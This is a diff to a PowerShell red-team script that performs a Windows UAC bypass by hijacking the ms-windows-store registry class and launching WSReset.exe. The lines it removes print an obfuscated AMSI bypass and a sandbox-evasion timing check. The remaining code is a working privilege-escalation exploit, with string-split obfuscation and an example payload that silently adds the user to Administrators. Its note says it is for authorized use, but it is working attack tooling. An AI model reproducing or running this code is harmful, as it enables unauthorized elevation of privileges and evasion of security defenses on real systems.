@@ -47,17 +47,11 @@
 .PARAMETER Payload
     Command to execute with High integrity.
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .PARAMETER Timeout
     Seconds to wait before cleanup (default: 4).
 
 .EXAMPLE
-    Invoke-WSResetBypass -Payload "cmd.exe" -SkipChecks
+    Invoke-WSResetBypass -Payload "cmd.exe"
 
 .EXAMPLE
     $cmd = "powershell.exe -NoP -W Hidden -C `"Add-LocalGroupMember -Group Administrators -Member $env:USERNAME`""
@@ -67,8 +61,8 @@
     Authorized red/purple-team use only.  Requires written SOW.
     Minimum build: 17763 (RS5 / October 2018 Update).
     WSReset.exe must exist at %SystemRoot%\System32\WSReset.exe.
-    If the Windows Store is removed/disabled on the target, WSReset.exe
-    may still be present but behave differently.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -77,89 +71,22 @@ param(
     [ValidateNotNullOrEmpty()]
     [string]$Payload,
 
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
-    [int]   $Timeout = 4
+    [int]$Timeout = 4
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
 
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-
-    # Build check — minimum RS5 (17763)
-    try {
-        $xBld = [int](Get-ItemPropertyValue `
-                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
-                    'CurrentBuildNumber' -EA Stop)
-    } catch { $xBld = [Environment]::OSVersion.Version.Build }
-    if ($xBld -lt 17763) {
-        Write-Warning "[WSReset] Requires build 17763+ (RS5). Current: $xBld"
-        return
-    }
-
-    # WSReset.exe present?
-    $xBin = $env:SystemRoot + '\System32\WSReset.exe'
-    if (-not (Test-Path $xBin)) {
-        Write-Warning '[WSReset] WSReset.exe not found — Windows Store may be absent.'
-        return
-    }
-
-    # Admin check
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[WSReset] Already elevated — no bypass needed.'
-        return
-    }
-
-    # UAC policy
-    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[WSReset] AlwaysNotify active (behavior=$xBeh) — method will not work."
-        return
-    }
-
-    # Timing gate
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[WSReset] Timing anomaly — aborting.'
-        return
-    }
+#region ── Core loader (for registry helpers) ────────────────────────────────
+if (-not (Get-Command 'Set-ShellClassCommand' -ErrorAction SilentlyContinue)) {
+    . "$PSScriptRoot\..\Core\Invoke-UACCore.ps1"
 }
 #endregion
 
 #region ── Registry key setup ────────────────────────────────────────────────
 # ms-windows-store class — note the different class name vs ms-settings
-$xRoot  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
-$xCls   = 'ms-wind' + 'ows-st' + 'ore'
-$xPath  = $xRoot + $xCls + '\Shell\Open\command'
-
 try {
-    New-Item -Path $xPath -Force | Out-Null
-    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
-    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
-                      -PropertyType String -Force | Out-Null
+    Set-ShellClassCommand -ClassKey ('ms-wind' + 'ows-st' + 'ore') -Payload $Payload
     Write-Verbose '[WSReset] Registry key written.'
 }
 catch {
@@ -179,7 +106,7 @@ catch {
     Write-Warning "[WSReset] Launch failed: $_"
 }
 finally {
-    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-ShellClassKey -ClassKey ('ms-wind' + 'ows-st' + 'ore')
     Write-Verbose '[WSReset] Registry cleanup complete.'
 }
 #endregion
